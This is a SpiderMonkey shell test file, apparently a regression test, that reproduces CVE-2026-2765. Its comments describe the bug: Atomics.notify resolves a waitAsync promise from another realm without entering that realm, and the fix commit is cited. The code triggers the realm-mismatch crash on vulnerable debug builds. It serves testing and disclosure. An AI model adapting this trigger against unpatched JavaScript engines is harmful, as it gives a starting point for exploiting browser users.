// CVE-2026-2765 / Bugzilla 2013562
// Same-thread Atomics.waitAsync cross-realm resolution: js::atomics_notify_impl
// iterates promisesToResolve and calls PromiseObject::resolve(cx, promise, ...)
// without entering the promise's realm. When a SharedArrayBuffer is shared with
// another realm and that realm's code calls Atomics.waitAsync, its promise lives
// in the other realm. A subsequent Atomics.notify from the main realm reaches
// PromiseObject::resolve while cx is still in the wrong realm, tripping
// AutoRealm/compartment invariants in ASAN/debug builds.
//
// Fix: 23cf0b3985c329aae2898bae518a7f5813c132ae — wraps the resolve call with
//      `AutoRealm ar(cx, promisesToResolve[i])` before each PromiseObject::resolve.

const sab = new SharedArrayBuffer(8);
const i32 = new Int32Array(sab);

const g = newGlobal({ newCompartment: true });
g.sab = sab;

// Register an async waiter from the OTHER realm. The returned promise lives in g.
g.eval(`
  const ia = new Int32Array(sab);
  this.p = Atomics.waitAsync(ia, 0, 0).value;
  // Hold a reference so it isn't GC'd.
  this.p.then(() => {}, () => {});
`);

// Notify from the main realm. atomics_notify_impl walks the waiter list, finds
// g's promise, and resolves it without entering g — vulnerable build crashes
// or asserts on the realm/compartment mismatch.
Atomics.notify(i32, 0);

// Drain microtasks so the resolution path runs synchronously inside this turn.
if (typeof drainJobQueue === "function") {
  drainJobQueue();
}
